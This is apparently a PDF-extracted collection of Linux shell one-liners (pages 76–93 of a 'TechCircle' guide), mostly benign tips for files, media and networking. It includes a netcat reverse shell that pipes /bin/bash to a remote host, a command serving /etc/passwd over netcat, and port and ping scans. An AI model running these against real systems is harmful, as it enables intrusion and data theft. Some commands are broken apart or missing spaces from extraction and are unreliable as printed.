$ readlink -f ../super/symlink_bon/ahoy
```
### Create a Multi-Part Archive Without Proprietary Junkware
``` linux
$ tar czv Pictures | split -d -a 3 -b 16M - pics. tar.gz.
```
### List and delete files older than one year
``` linux
$ find <directory path> -mtime +365 -and -not -type d -delete
```
### Display last exit status of a command
``` linux
$ echo $?
```
### Enable ** to expand files recursively (>=bash-4.0)
``` linux
$ shopt -s globstar
```
### Command Line to Get the Stock Quote via Yahoo
``` linux
$ curl -s 'http://download.finance.yahoo.com/d/quotes.csv?s=csco&f=l1'
```
### Plays Music from SomaFM
``` linux
$ read -p "Which station? "; mplayer --reallyquiet -vo none -ao sdl
```
### http://somafm.com/startstream=${REPLY}.pls
```
### Convert camelCase to underscores (camel_case)
``` linux
$ sed -r 's/([a-z]+)([A-Z][a-z]+)/\1_\l\2/g' file.txt
```
### Set your profile so that you resume or start a screen session on
```
### login
``` linux
$ echo "screen -DR" >> ~/.bash_profile
```
### Play high-res video files on a slow processor
``` linux
$ mplayer -framedrop -vfm ffmpeg -lavdopts lowres=1:fast:skiploopfilter=all
```
### Create directory named after current date
``` linux
$ mkdir $(date +%Y%m%d)
```
### Monitor dynamic changes in the dmesg log.
``` linux
$ watch "dmesg |tail -15"
```
### Generate a list of installed packages on Debian-based systems
``` linux
$ dpkg --get-selections > LIST_FILE
```
### 76 | P a g e
```
### TechCircleFind the process that is using a certain port e.g. port 3000
``` linux
$ lsof -P | grep ':3000'
```
### Pause Current Thread
``` linux
$ ctrl-z
```
### Converts to PDF all the OpenOffice.org files in the directory
``` linux
$ for i in $(ls *.od{tp}); do unoconv -f pdf $i; done
```
### Create a bunch of dummy files for testing
``` linux
$ touch {1..10}.txt
```
### Convert .wma files to .ogg with ffmpeg
``` linux
$ find -name '*wma' -exec ffmpeg -i {} -acodec vorbis -ab 128k {}.ogg \;
```
### Find distro name and/or version/release
``` linux
$ cat /etc/*-release
```
### Generate Random Passwords
``` linux
$ < /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c6
```
### Bash shortcut: !$ !^ !* !:3 !:h and !:t
``` linux
$ echo foo bar foobar barfoo && echo !$ !^ !:3 !* && echo /usr/bin/foobar&& echo !
```
### $:h !$:t
```
### Grep without having it show its own process in the results
``` linux
$ ps aux | grep "[s]ome_text"
```
### Find recursively, from current directory down, files and directories
```
### whose names contain single or multiple whitespaces and replace
```
### each such occurrence with a single underscore.
``` linux
$ find ./ -name '*' -exec rename 's/\s+/_/g' {} \;
```
### Tells which group you DON'T belong to (opposite of command
```
### "groups") --- uses sed
``` linux
$ sed -e "/$USER/d;s/:.*//g" /etc/group | sed -e :a -e '/$/N;s/
```
### / /;ta'
```
### Quickly get summary of sizes for files and folders
``` linux
$ du -sh *
```
### 77 | P a g e
```
### TechCircleEcho the latest commands from commandlinefu on the console
``` linux
$ wget -O - http://www.commandlinefu.com/commands/browse/rss 2>/dev/null |
```
### awk '/\s*<title/ {z=match($0, /CDATA\[([^\]]*)\]/, b);print b[1]} /\s*<description/
```
### {c=match($0, /code>(.*)<\/code>/, d);print d[1]"
```
### "} '
```
### Optimal way of deleting huge numbers of files
``` linux
$ rsync -a --delete empty-dir/ target-dir/
```
### Drop first column of output by piping to this
``` linux
$ awk '{ $1="";print}'
```
### Create a bunch of dummy text files
``` linux
$ base64 /dev/urandom | head -c 33554432 |split -b 8192 -da 4 - dummy.
```
### Get the Nth argument of the last command (handling spaces
```
### correctly)
``` linux
$ !:n
```
### Temporarily ignore mismatched SSH host key
``` linux
$ ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
```
### username@host
```
### Remove all zero size files from current directory (not recursive)
``` linux
$ find . -maxdepth 1 -size 0c -delete
```
### Watch the progress of 'dd'
``` linux
$ pv -tpreb /dev/urandom | dd of=file.img
```
### Get a stream feed from a Twitter user
``` linux
$ step1 ; step2 ; step3 ; step4 ; curl -o- --get
```
### 'https://stream.twitter.com/1/statuses/filter.json' --header "$oauth_header" --data
```
### "follow=$id"
```
### Create the authorization header required for a Twitter stream feed
``` linux
$ step4() { oauth_header="Authorization: OAuth oauth_consumer_key=\"$k1\",
```
### oauth_nonce=\"$once\", oauth_signature=\"$signature\",
```
### oauth_signature_method=\"HMAC-SHA1\", oauth_timestamp=\"$ts\",
```
### oauth_token=\"$k3\", oauth_version=\"1.0\"" ; }
```
### Create the signature base string required for a Twitter stream feed
``` linux
$ step2(){ b="GET&https%3A%2F%2Fstream.twitter.com%2F1%2Fstatuses
```
### %2Ffilter.json&follow%3D${id}%26oauth_consumer_key%3D$
```
### {k1}%26oauth_nonce%3D${once}%26oauth_signature_method%3DHMAC-
```
### SHA1%26oauth_timestamp%3D${ts}%26oauth_token%3D${k3}%26oauth_version
```
### %3D1.0";}
```
### 78 | P a g e
```
### TechCircleCreate the oauth token required for a Twitter stream feed
``` linux
$ step3() { s=$( echo -n $b | openssl dgst -sha1 -hmac $hmac -binary | openssl
```
### base64); signature=`for((i=0;i<${#s};i++)); do case ${s:i:1} in +) e %2B;; /) e
```
### %2F;; =) e %3D;; *) e ${s:i:1};; esac ; done` ; } ; e() { echo -n $1; }
```
### Open a screenshot of a remote desktop via ssh
``` linux
$ xloadimage <(ssh USER@HOSTNAME DISPLAY=:0.0 import -window root png:-)
```
### Check your spelling
``` linux
$ aspell -a <<< '<WORDS>'
```
### Find all files larger than 500M and less than 1GB
``` linux
$ find / -type f -size +500M -size -1G
```
### Show bandwidth use oneliner
``` linux
$ while true; do cat /proc/net/dev; sleep 1; done |awk -v dc="date \"+%T\"" '/eth0/{i
```
### = $2 - oi; o = $10 - oo; oi = $2; oo = $10; dc|getline d; close(dc); if (a++) printf "%s
```
### %8.2f KiB/s in %8.2f KiB/s out
```
### ", d, i/1024, o/1024}'
```
### Change/Modify timestamp interactively
``` linux
$ touch -d $(zenity --calendar --date-format=%F) filename
```
### Sort the contents of a text file in place.
``` linux
$ sort -g -o list.txt{,}
```
### Instantly load bash history of one shell into another running shell
``` linux
$ $ history -a #in one shell , and $ history -r #in another running shell
```
### Copy with progress bar - rsync
``` linux
$ rsync -rv <src> <dst> --progress
```
### Multiple variable assignments from command output in BASH
``` linux
$ read day month year < <(date +'%d %m %y')
```
### Generate a random password 30 characters long
``` linux
$ gpg --gen-random --armor 1 30
```
### Run a ext4 file system check and badblocks scan with progress info
``` linux
$ fsck.ext4 -cDfty -C 0 /dev/sdxx
```
### List your MACs address
``` linux
$ cat /sys/class/net/eth0/address
```
### 79 | P a g e
```
### TechCircleRename all files which contain the sub-string 'foo', replacing it with
```
### 'bar'
``` linux
$ for i in ./*foo*;do mv -- "$i" "${i//foo/bar}";done
```
### Create a 5 MB blank file via a seek hole
``` linux
$ dd if=/dev/zero of=testfile.seek seek=5242879 bs=1 count=1
```
### ROT13 using the tr command
``` linux
$ alias rot13="tr a-zA-Z n-za-mN-ZA-M"
```
### Make vim open in tabs by default (save to .profile)
``` linux
$ alias vim="vim -p"
```
### Secure copy from one server to another without rsync and preserve
```
### users, etc
``` linux
$ tar -czvf - /src/dir | ssh remotehost "(cd /dst/dir ; tar -xzvf -)"
```
### The same as [Esc] in vim
``` linux
$ Ctrl + [
```
### Binary clock
``` linux
$ perl -e 'for(;;){@d=split("",`date +%H%M%S`);print"\r";for(0..5){printf"%.4b ",
```
### $d[$_]}sleep 1}'
```
### Function to split a string into an array
``` linux
$ read -a ARR <<<'world domination now!'; echo${ARR[2]};
```
### Generate MD5 hash for a string
``` linux
$ md5sum <<<"test"
```
### Recompress all .gz files in current directory using bzip2 running 1
```
### job per CPU core in parallel
``` linux
$ parallel -j+0 "zcat {} | bzip2 >{.}.bz2 && rm {}" ::: *.gz
```
### Phpinfo from the command line
``` linux
$ php -i
```
### Run a command whenever a file is touched
``` linux
$ ontouchdo(){ while :; do a=$(stat -c%Y "$1"); [ "$b" != "$a" ] && b="$a" && sh -c
```
### "$2"; sleep 1; done }
```
### Escape potential tarbombs
``` linux
$ atb() { l=$( tar tf $1); if [ $(echo "$l" | wc -l) -eq $(echo "$l" | grep $(echo "$l" |
```
### head -n1) | wc -l) ]; then tar xf $1; else mkdir ${1%. tar.gz} && tar xf $1 -C ${1%.
```
### tar.gz}; fi ;}
```
### 80 | P a g e
```
### TechCirclePretend to be busy in office to enjoy a cup of coffee
``` linux
$ for i in {0..600}; do echo $i; sleep 1; done |dialog --gauge "Install..." 6 40
```
### Get notified when a job you run in a terminal is done, using
```
### NotifyOSD
``` linux
$ alias alert='notify-send -i /usr/share/icons/gnome/32x32/apps/gnome-terminal.png
```
### "[$?] $(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/;\s*alert$//'\'')"'
```
### Runs a X session within your X session
``` linux
$ ssh -C -Y -l$USER xserver.mynet.xx 'Xnest -geometry 1900x1150 -query localhost'
```
### Use screen as a terminal emulator to connect to serial consoles
``` linux
$ screen /dev/tty<device> 9600
```
### Have a random "cow" say a random thing
``` linux
$ fortune | cowsay -f $(ls /usr/share/ cowsay/cows/ | shuf -n1)
```
### Sends a postscript file to a postscript printer using netcat
``` linux
$ cat my.ps | nc -q 1 hp4550.mynet.xx 9100
```
### Lines in file2 that are not in file1
``` linux
$ grep -Fxv -f file1 file2
```
### Display which distro is installed
``` linux
$ cat /etc/*release
```
### Fetch every font from dafont.com to current folder
``` linux
$ d="www.dafont.com/alpha.php?";for c in {a..z}; do l=`curl -s "${d}lettre=${c}"|
```
### sed -n 's/.*ge=\([0-9]\{2\}\).*/\1/p'`;for((p=1;p<=l;p++));do for u in `curl -s "$
```
### {d}page=${p}&lettre=${c}"|egrep -o "http\S*.com/dl/\?f=\w*"`;do aria2c "$
```
### {u}";done;done;done
```
### Intercept stdout/stderr of another process
``` linux
$ strace -ff -e write=1,2 -s 1024 -p PID 2>&1 |grep "^ |" | cut -c11-60 | sed -e 's/ //g'
```
### | xxd -r -p
```
### Send DD a signal to print its progress
``` linux
$ while :;do killall -USR1 dd;sleep 1;done
```
### Open Remote Desktop (RDP) from command line and connect local
```
### resources
``` linux
$ rdesktop -a24 -uAdministrator -pPassword -r clipboard:CLIPBOARD -r
```
### disk:share=~/share -z -g 1280x900 -0 $@ &
```
### 81 | P a g e
```
### TechCircleSee your current RAM frequency
``` linux
$ dmidecode -t 17 | awk -F":" '/Speed/ { print $2 }'
```
### Scp with compression.
``` linux
$ scp -C 10.0.0.4:/tmp/backup.sql /path/to/backup.sql
```
### Perl Command Line Interpreter
``` linux
$ perl -e 'while(1){print"> ";eval<>}'
```
### Find unused IPs on a given subnet
``` linux
$ nmap -T4 -sP 192.168.2.0/24 && egrep"00:00:00:00:00:00" /proc/net/arp
```
### Find and delete empty dirs, start in current working dir
``` linux
$ find . -type d -empty -delete
```
### Check which files are opened by Firefox then sort by largest size.
``` linux
$ lsof -p $(pidof firefox) | awk '/.mozilla/ { s = int($7/(2^20)); if(s>0) print (s)" MB --
```
### "$9 | "sort -rn" }'
```
### Optimal way of deleting huge numbers of files
``` linux
$ find /path/to/dir -type f -delete
```
### Geoip information
``` linux
$ curl -s "http://www.geody.com/geoip.php?ip=$( curl -s icanhazip.com)" | sed
```
### '/^IP:/!d;s/<[^>][^>]*>//g'
```
### What is my ip?
``` linux
$ curl http://www.whatismyip.org/
```
### FAST Search and Replace for Strings in all Files in Directory
``` linux
$ sh -c 'S=askapache R=htaccess; find . -mount -type f|xargs -P5 -iFF grep -l -m1
```
### "$S" FF|xargs -P5 -iFF sed -i -e "s%${S}%${R}%g" FF'
```
### Get the total length of all video / audio in the current dir (and
```
### below) in H:m:s
``` linux
$ find -type f -name "*.avi" -print0 | xargs -0 mplayer -vo dummy -ao dummy -
```
### identify 2>/dev/null | perl -nle '/ID_LENGTH=([0-9\.]+)/ && ($t +=$1) && printf
```
### "%02d:%02d:%02d
```
### ",$t/3600,$t/60%60,$t%60' | tail -n 1
```
### Send data securly over the net.
``` linux
$ cat /etc/passwd | openssl aes-256-cbc -a -e -pass pass:password | net cat -l -p
```
### 8080
```
### When was your OS installed?
``` linux
$ ls -lct /etc | tail -1 | awk '{print $6, $7}'
```
### 82 | P a g e
```
### TechCircleHow to run a command on a list of remote servers read from a file
``` linux
$ while read server; do ssh -n user@$server "command"; done < servers.txt
```
### Replace spaces in filenames with underscorees
``` linux
$ ls | while read f; do mv "$f" "${f// /_}";done
```
### Find the biggest files recursively, no matter how many
``` linux
$ find . -type f -printf '%20s %p
```
### ' | sort -n | cut -b22- | tr '
```
### ' '\000' | xargs -0 ls -laSr
```
### Grep certain file types recursively
``` linux
$ grep -r --include="*.[ch]" pattern .
```
### Change proccess affinity.
``` linux
$ taskset -cp <core> <pid>
```
### Back up your commandlinefu contributed commands
``` linux
$ curlhttp://www.commandlinefu.com/commands/by/<your username>/rss|gzip -
```
### >commandlinefu-contribs-backup-$(date +%Y-%m-%d-%H.%M.%S).rss.gz
```
### Currently mounted filesystems in nice layout
``` linux
$ column -t /proc/mounts
```
### Benchmark web server with apache benchmarking tool
``` linux
$ ab -n 9000 -c 900 localhost:8080/index.php
```
### Salvage a borked terminal
``` linux
$ echo <ctrl-v><esc>c<enter>
```
### Multiple SSH Tunnels
``` linux
$ ssh -L :: -L :: @
```
### LDAP search to query an ActiveDirectory server
``` linux
$ ldapsearch -LLL -H ldap://activedirectory.example.com:389 -b
```
### 'dc=example,dc=com' -D 'DOMAIN\Joe.Bloggs' -w 'p@ssw0rd'
```
### '(sAMAccountName=joe.bloggs)'
```
### Easily scp a file back to the host you're connecting from
``` linux
$ mecp () { scp "$@" ${SSH_CLIENT%% *}:Desktop/; }
```
### Super Speedy Hexadecimal or Octal Calculations and Conversions to
```
### Decimal.
``` linux
$ echo "$(( 0x10 )) - $(( 010 )) = $(( 0x10 - 010 ))"
```
### 83 | P a g e
```
### TechCircleFind and replace tabs for spaces within files recursively
``` linux
$ find ./ -type f -exec sed -i 's/\t/ /g' {} \;
```
### Delete all files found in directory A from directory B
``` linux
$ for file in <directory A>/*; do rm <directory B>/`basename $ file`; done
```
### Synchronicity
``` linux
$ cal 09 1752
```
### Terminal redirection
``` linux
$ script /dev/null | tee /dev/pts/3
```
### Displays the attempted user name, ip address, and time of SSH
```
### failed logins on Debian machines
``` linux
$ awk '/sshd/ && /Failed/ {gsub(/invalid user/,"");printf "%-12s %-16s %s-%s-%s
```
### ", $9, $11, $1, $2, $3}' /var/log/auth.log
```
### Rot13 using the tr command
``` linux
$ alias rot13="tr '[A-Za-z]' '[N-ZA-Mn-za-m]'"
```
### Measures download speed on eth0
``` linux
$ while true; do X=$Y; sleep 1; Y=$(ifconfig eth0|grep RX\ bytes|awk '{ print $2 }'|
```
### cut -d : -f 2);echo "$(( Y-X )) bps"; done
```
### Clean swap area after using a memory hogging application
``` linux
$ swapoff -a ; swapon -a
```
### Loop over a set of items that contain spaces
``` linux
$ ls | while read ITEM; do echo "$ITEM"; done
```
### Traceroute w/TCP to get through firewalls.
``` linux
$ tcptraceroute www.google.com
```
### Launch a command from a manpage
``` linux
$ !date
```
### Split File in parts
``` linux
$ split -b 19m file Nameforpart
```
### Speak the top 6 lines of your twitter timeline every 5 minutes.....
``` linux
$ while [ 1 ]; do curl -s -u username:password
```
### http://twitter.com/statuses/friends_timeline.rss|grep title|sed -ne 's/<\/*title>//gp' |
```
### head -n 6 |festival --tts; sleep 300;done
```
### 84 | P a g e
```
### TechCircleCreate an SSH SOCKS proxy server on localhost:8000 that will re-
```
### start itself if something breaks the connection temporarily
``` linux
$ autossh -f -M 20000 -D 8000 somehost -N
```
### To get you started!
``` linux
$ vimtutor
```
### Exclude grep from your grepped output of ps (alias included in
```
### description)
``` linux
$ ps aux | grep [h]ttpd
```
### Renames multiple files that match the pattern
``` linux
$ rename 's/foo/bar/g' *
```
### Block an IP address from connecting to a server
``` linux
$ iptables -A INPUT -s 222.35.138.25/32 -j DROP
```
### Infile search and replace on N files (including backup of the files)
``` linux
$ perl -pi.bk -e's/foo/bar/g' file1 file2 fileN
```
### Show running services (using systemctl)
``` linux
$ command systemctl --no-page --no-legend --plain -t service --state=running
```
### Binary clock
``` linux
$ perl -e 'for(;;sleep 1){printf"\r"."%.4b "x6,split"",`date +%H%M%S`}'
```
### Pulsed terminal clock
``` linux
$ clear;while true;sleep 1;do for((a=1;a<=$( tput cols)/3;a++));do tput cup 0
```
### $a;echo " " $(date);done;sleep 1;for((a;a>=1;a--));do tput cup 0 $a;echo $(date) "
```
### ";done;done
```
### Removes characters from cursor to the end of line
``` linux
$ Ctrl+k
```
### All what exists in dir B and not in dir A will be copied from dir B to
```
### new or existing dir C
``` linux
$ rsync -v -r --size-only --compare-dest=../A/ B/ C/
```
### Find previously entered commands (requires configuring .inputrc)
``` linux
$ <Meta-p> (aka <ALT+P>)
```
### Add directory to $PATH if it's not already there
``` linux
$ if [[ ":$PATH:" != *":$dir:"* ]]; then PATH=${PATH}:$dir; fi
```
### 85 | P a g e
```
### TechCircleDebug how files are being accessed by a process
``` linux
$ inotifywait -m -r .
```
### Retry the previous command until it exits successfully
``` linux
$ !!; while [ $? -ne 0 ]; do !!; done
```
### Convert JSON to YAML
``` linux
$ python -c 'import sys, yaml, json; yaml.safe_dump(json.load(sys.stdin), sys.stdout,
```
### default_flow_style=False)' < file.json > file.yaml
```
### Search google.com on your terminal
``` linux
$ Q="YOURSEARCH"; GOOG_URL="http://www.google.com/search?q=";
```
### AGENT="Mozilla/4.0"; stream=$(curl -A "$AGENT" -skLm 10 "${GOOG_URL}\"$
```
### {Q/\ /+}\"" | grep -oP '\/url\?q=.+?&amp' | sed 's/\/url?q=//;s/&amp//'); echo -e "$
```
### {stream//\%/\x}"
```
### Play awesome rythmic noise using aplay
``` linux
$ echo "main(i){for(i=0;;i++)putchar(((i*(i>>8|i>>9)&46&i>>8))^(i&i>>13|
```
### i>>6));}" | gcc -x c - && ./a.out | aplay
```
### Turns red the stderr output
``` linux
$ color()(set -o pipefail;"$@" 2>&1>&3|sed $'s,.*,\e[31m&\e[m,'>&2)3>&1
```
### Recursively unrar into dir containing archive
``` linux
$ find . -name '*.rar' -execdir unrar e {} \;
```
### True Random Dice Roll
``` linux
$ tr -cd '1-6' < /dev/urandom | head -c 1; echo
```
### Find biggest 10 files in current and subdirectories and sort by file
```
### size
``` linux
$ find . -type f -print0 | xargs -0 du -h | sort -hr |head -10
```
### Get your external IP and Network Info
``` linux
$ curl ifconfig.me/all
```
### List all commands present on system
``` linux
$ ls ${PATH//:/ }
```
### A line across the entire width of the terminal
``` linux
$ printf "%$(tput cols)s
```
### "|tr ' ' '='
```
### Recursively find top 20 largest files (> 1MB) sort human readable
```
### format
``` linux
$ find . -type f -print0 | xargs -0 du -h | sort -hr |head -20
```
### 86 | P a g e
```
### TechCircleCreate the four oauth keys required for a Twitter stream feed
``` linux
$ step1() { k1="Consumer key" ; k2="Consumer secret" ; k3="Access token" ;
```
### k4="Access token secret" ; once=$RANDOM ; ts=$(date +%s) ; hmac="$k2&$k4" ;
```
### id="19258798" ; }
```
### Check if a machine is online
``` linux
$ ping -c 1 -q MACHINE_IP_OR_NAME >/dev/null 2>&1 && echo ONLINE || echo
```
### OFFLINE
```
### Extract element of xml
``` linux
$ xmlstarlet sel -t -c "/path/to/element" file.xml
```
### Generate a random password 30 characters long
``` linux
$ cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 32
```
### Remove the first and the latest caracter of a string
``` linux
$ var=:foobar:; echo ${var:1:-1}
```
### Load file into RAM (cache) for faster accessing for repeated usage
``` linux
$ cat <file> > /dev/null
```
### Show IP Address in prompt --> PS1 var
``` linux
$ export PS1="[\u@`hostname -I` \W]$ "
```
### Log a command to console and to 2 files separately stdout and
```
### stderr
``` linux
$ command > >(tee stdout.log) 2> >(tee stderr.log >&2)
```
### Join lines split with backslash at the end
``` linux
$ sed -e '/\\$/{:0;N;s/\\
```
### //;t0}'
```
### Convert text to lowercase
``` linux
$ lower() { echo ${@,,}; }
```
### Find builtin in bash v4+
``` linux
$ ls -l /etc/**/*killall
```
### Make image semi-transparent
``` linux
$ convert input.png -alpha set -channel A -fx 0.5 output.png
```
### Compare directories via diff
``` linux
$ diff -rq dirA dirB
```
### 87 | P a g e
```
### TechCircleExecute a shell with netcat without -e
``` linux
$ mknod backpipe p && nc remote_server 1337 0<backpipe | /bin/bash 1>backpipe
```
### Save your terminal commands in bash history in real time
``` linux
$ shopt -s histappend ; PROMPT_COMMAND="history -a;$PROMPT_COMMAND"
```
### Connect via SSH to VirtualBox guest VM without knowing IP address
``` linux
$ ssh vm-user@`VBoxManage guestproperty get "vm-name"
```
### "/VirtualBox/GuestInfo/Net/0/V4/IP" |awk '{ print $2 }'`
```
### Make redirects to localhost via /etc/hosts more interesting
``` linux
$ sudo socat TCP4-LISTEN:80,bind=127.0.0.1,fork EXEC:'echo "HTTP/1.1 503
```
### Service Unavailable";'
```
### Screensaver
``` linux
$ alias screensaver='for ((;;)); do echo -ne "\033[$((1+RANDOM%LINES));$
```
### ((1+RANDOM%COLUMNS))H\033[$((RANDOM%2));3$((RANDOM%8))m$((RANDOM
```
### %10))"; sleep 0.1 ; done'
```
### Tricky implementation of two-dimensional array in Bash.
``` linux
$ arr[i*100+j]="whatever"
```
### Terrorist threat level text
``` linux
$ echo "Terrorist threat level: `od -An -N1 -i /dev/random`"
```
### Bash logger
``` linux
$ script /tmp/log.txt
```
### Use wget to download one page and all it's requisites for offline
```
### viewing
``` linux
$ wget -e robots=off -E -H -k -K -p http://<page>
```
### Convert a string to "Title Case"
``` linux
$ echo "this is a test" | sed 's/.*/\L&/; s/[a-z]*/\u&/g'
```
### RTFM function
``` linux
$ rtfm() { help $@ || info $@ || man $@ || $BROWSER
```
### "http://www.google.com/search?q=$@"; }
```
### Back ssh from firewalled hosts
``` linux
$ ssh -R 5497:127.0.0.1:22 -p 62220 user@public.ip
```
### Rename HTML files according to their title tag
``` linux
$ perl -wlne'/title>([^<]+)/i&&rename$ARGV,"$1.html"' *.html
```
### 88 | P a g e
```
### TechCircleRename files according to file with colums of corresponding names
``` linux
$ xargs -n 2 mv < file_with_colums_of_names
```
### Create a new file
``` linux
$ > file
```
### Monitor a file with tail with timestamps added
``` linux
$ tail -f file | awk '{now=strftime("%F %T%z\t");sub(/^/, now);print}'
```
### Check disk for bad sectors
``` linux
$ badblocks -n -s -b 2048 /dev/sdX
```
### Create a file of a given size in linux
``` linux
$ truncate -s 1M file
```
### Pretend to be busy in office to enjoy a cup of coffee
``` linux
$ while [ true ]; do head -n 100 /dev/urandom;sleep .1; done | hexdump -C | grep
```
### "ca fe"
```
### Extended man command
``` linux
$ /usr/bin/man $* || w3m -dump http://google.com/search?q="$*"\&btnI | less
```
### Show which process is blocking umount (Device or resource is busy)
``` linux
$ lsof /folder
```
### Show the UUID of a filesystem or partition
``` linux
$ blkid /dev/sda7
```
### Run command on a group of nodes
``` linux
$ mussh -h host1 host2 host3 -c uptime
```
### Setting global redirection of STDERR to STDOUT in a script
``` linux
$ exec 2>&1
```
### Outgoing IP of server
``` linux
$ dig +short @resolver1.opendns.com myip.opendns.com
```
### Isolate file name from full path/find output
``` linux
$ echo ${fullpath##*/}
```
### Show numerical values for each of the 256 colors in bash
``` linux
$ for i in {0..255}; do echo -e "\e[38;05;${i}m${i}"; done | column -c 80 -s ' '; echo
```
### -e "\e[m"
```
### 89 | P a g e
```
### TechCircleFind all symlinks that link to directories
``` linux
$ find -type l -xtype d
```
### Use Kernighan & Ritchie coding style in C program
``` linux
$ indent -kr hello.c
```
### Delay execution until load average falls under 1.5
``` linux
$ echo 'some command' | batch
```
### Backup with mysqldump a really big mysql database to a remote
```
### machine over ssh
``` linux
$ mysqldump -q --skip-opt --force --log-error=dbname_error.log -uroot -
```
### pmysqlpassword dbname | ssh -C user@ sshserver 'cd /path/to/backup/dir; cat >
```
### dbname.sql'
```
### Tail -f at your own pace
``` linux
$ tail -fs 1 somefile
```
### Watch the progress of 'dd'
``` linux
$ dd if=/dev/zero | pv | dd of=/dev/null
```
### Realtime lines per second in a log file
``` linux
$ tail -f access.log | pv -l -i10 -r >/dev/null
```
### Smart `cd`.. cd to the file directory if you try to cd to a file
``` linux
$ cd() { if [ -z "$1" ]; then command cd; else if [ -f "$1" ]; then command cd $
```
### (dirname "$1"); else command cd "$1"; fi; fi; }
```
### Temporarily ignore known SSH hosts
``` linux
$ ssh -o UserKnownHostsFile=/dev/null root@192.168.1.1
```
### Dd with progress bar
``` linux
$ dd if=/dev/nst0 |pv| dd of=restored_file.tar
```
### Save the Top 2500 commands from commandlinefu to a single text
```
### file
``` linux
$ curlhttp://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-
```
### 2500:25] | grep -v _ curl_ > comfu.txt
```
### Print a row of 50 hyphens
``` linux
$ python -c 'print "-"*50'
```
### Display a wave pattern
``` linux
$ ruby -e "i=0;loop{puts ' '*(29*(Math.sin(i)/2+1))+'|'*(29*(Math.cos(i)/2+1));
```
### i+=0.1}"
```
### 90 | P a g e
```
### TechCircleGrep tab chars
``` linux
$ grep "^V<TAB>" your_file
```
### Send a message to a windows machine in a popup
``` linux
$ echo "message" | smbclient -M NAME_OF_THE_COMPUTER
```
### Using mplayer to play the audio only but suppress the video
``` linux
$ mplayer -novideo something.mpg
```
### Using mplayer to play the audio only but suppress the video
``` linux
$ mplayer -vo null something.mpg
```
### Create a temporary file in a command line call
``` linux
$ any_script.sh < <(some command)
```
### Shell function to make gnu info act like man.
``` linux
$ my info() { info --subnodes -o - $1 | less; }
```
### Replace spaces in filenames with underscores
``` linux
$ for f in *;do mv "$f" "${f// /_}";done
```
### Insert the last argument of the previous command
``` linux
$ !$
```
### Change the From: address on the fly for email sent from the
```
### command-line
``` linux
$ mail -s "subject" user@todomain.com <emailbody.txt -- -f
```
### customfrom@fromdomain.com -F 'From Display Name'
```
### Remote control for Rhythmbox on an Ubuntu Media PC
``` linux
$ alias rc='ssh ${MEDIAPCHOSTNAME} envDISPLAY=:0.0 rhythmbox-client --no-
```
### start'
```
### Use colordiff in side-by-side mode, and with automatic column
```
### widths.
``` linux
$ colordiff -yW"`tput cols`" /path/to/file1 /path/to/file2
```
### Extract email adresses from some file (or any other pattern)
``` linux
$ grep -Eio '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\.[[:alpha:].]{2,6})'
```
### Amazing real time picture of the sun in your wallpaper
``` linux
$ curlhttp://sohowww.nascom.nasa.gov/data/realtime/eit_195/512/latest.jpg | xli -
```
### onroot -fill stdin
```
### 91 | P a g e
```
### TechCircleBash screensaver off
``` linux
$ setterm -powersave off -blank 0
```
### Convert vdi to vmdk (virtualbox hard disk conversion to vmware
```
### hard disk format)
``` linux
$ VBoxManage internalcommands converttoraw winxp.vdi winxp.raw && qemu-img
```
### convert -O vmdk winxp.raw winxp.vmdk && rm winxp.raw
```
### Smart renaming
``` linux
$ mmv 'banana_*_*.asc' 'banana_#2_#1.asc'
```
### Is today the end of the month?
``` linux
$ [ `date --date='next day' +'%B'` == `date +'%B'` ] || echo 'end of month'
```
### Port scan a range of hosts with Netcat.
``` linux
$ for i in {21..29}; do nc -v -n -z -w 1 192.168.0.$i 443; done
```
### Log your internet download speed
``` linux
$ echo $(date +%s) > start-time; URL=http://www.google.com; while true; do echo
```
### $(curl -L --w %{speed_download} -o/dev/null -s $URL) >> bps; sleep 10; done &
```
### Show Directories in the PATH Which does NOT Exist
``` linux
$ (IFS=:;for p in $PATH; do test -d $p || echo $p; done)
```
### Backup files older than 1 day on /home/dir, gzip them, moving old
```
### file to a dated file.
``` linux
$ find /home/dir -mtime +1 -print -exec gzip -9 {} \; -exec mv {}.gz {}_`date +
```
### %F`.gz \;
```
### Alias to close terminal with :q
``` linux
$ alias ':q'='exit'
```
### Display an embeded help message from bash script header
``` linux
$ [ "$1" == "--help" ] && { sed -n -e '/^# Usage:/,/^$/ s/^# \?//p' < $0; exit; }
```
### Sort file greater than a specified size in human readeable format
```
### including their path and typed by color, running from current
```
### directory
``` linux
$ find ./ -size +10M -type f -print0 | xargs -0 ls -Ssh1 --color
```
### Print file without duplicated lines using awk
``` linux
$ awk '!a[$0]++' file
```
### Get the 10 biggest files/folders for the current direcotry
``` linux
$ du -sk * |sort -rn |head
```
### 92 | P a g e
```
### TechCircleGet your external IP address
``` linux
$ curl -s 'http://checkip.dyndns.org' | sed's/.*Current IP Address: \([0-9\.]*\).*/\1/g'
```
### Send email with one or more binary attachments
``` linux
$ echo "Body goes here" | mutt -s "A subject" -a /path/to/file.tar.gz
```
### recipient@example.com
```
### Convert a web page into a png
``` linux
$ touch $2;firefox -print $1 -printmode PNG -printfile $2
```
### Uncomment the lines where the word DEBUG is found
``` linux
$ sed '/^#.*DEBUG.*/ s/^#//' $FILE
```
### This toggles mute on the Master channel of an alsa soundcard
``` linux
$ amixer sset Master toggle
```
### Submit data to a HTML form with POST method and save the
```
### response
``` linux
$ curl -sd 'rid=value&submit=SUBMIT' <URL> > out.html
```
### Count how many times a string appears in a (source code) tree
``` linux
$ $ grep -or string path/ | wc -l
```
### Search commandlinefu from the CLI
``` linux
$ curl -sd q=Network http://www.commandlinefu.com/search/autocomplete |
```
### html2text -width 100
```
### Compare a remote file with a local file
``` linux
$ vimdiff <file> scp://[<user>@]<host>/<file>
```
### Using netcat to copy files between servers
``` linux
$ On target: "nc -l 4000 | tar xvf -" On source: " tar -cf - . | nc target_ip 4000"
```
### Search command history on bash
``` linux
$ ctrl + r
```
### Redirect incoming traffic to SSH, from a port of your choosing
``` linux
$ iptables -t nat -A PREROUTING -p tcp --dport [port of your choosing] -j REDIRECT --
```
### to-ports 22
```
### Using bash inline
``` linux
$ <<<"k=1024; m=k*k; g=k*m; g" bc
```
### 93 | P a g e
```
### TechCircleAlt + 1 .
``` linux
$ alt + 1 .
```
